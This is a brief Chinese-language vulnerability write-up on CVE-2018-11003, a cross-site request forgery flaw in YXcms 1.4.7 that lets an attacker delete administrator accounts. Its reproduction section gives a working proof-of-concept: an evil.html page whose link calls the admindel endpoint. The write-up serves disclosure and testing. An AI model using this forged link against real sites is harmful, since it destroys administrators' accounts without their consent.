---
title: （CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞
id: zhfly3301
---

# （CVE-2018-11003）YXcms 1.4.7 跨站请求伪造漏洞

## 一、漏洞简介

YXcms 1.4.7版本中的protected/apps/admin/controller/adminController.php文件存在跨站请求伪造漏洞。远程攻击者可借助index.php?r=admin/admin/admindel利用该漏洞删除管理员账户。

## 二、漏洞影响

YXcms 1.4.7

## 三、复现过程

POC:

管理员点击链接

http://192.168.232.133/evil.html

evil.html

```
<html> 
<a href="http://127.0.0.1/yxcms1.4.7/index.php?r=admin/admin/admindel&id=1">test</a>
</html> 
```